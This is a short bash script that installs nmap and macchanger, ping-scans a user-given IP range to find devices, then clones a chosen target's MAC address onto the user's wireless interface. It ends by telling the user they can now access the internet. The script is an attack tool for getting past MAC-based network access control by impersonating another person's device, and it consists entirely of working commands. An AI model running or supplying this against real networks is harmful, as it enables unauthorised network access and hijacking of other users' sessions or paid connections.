#! /bin/bash

clear

echo ++++++++++++++++++++++++

echo

echo   MUST BE RUN AS ROOT

echo

echo ++++++++++++++++++++++++

sleep 1

echo Checking requirements...

pacman -S macchanger nmap

sudo pacman -S macchanger nmap

sudo apt install macchanger nmap

apt install macchanger nmap

clear

read -p "Enter wireless interface: " interface

clear

read -p "Enter IP range to scan: " range

echo

echo Scanning...

sleep 2

nmap -sP $range

echo

read -p "Enter target MAC address: " target

clear

echo Spoofing MAC...

sleep 2

echo 

macchanger -m $target $interface

echo 

echo Done! Now you can access the internet.
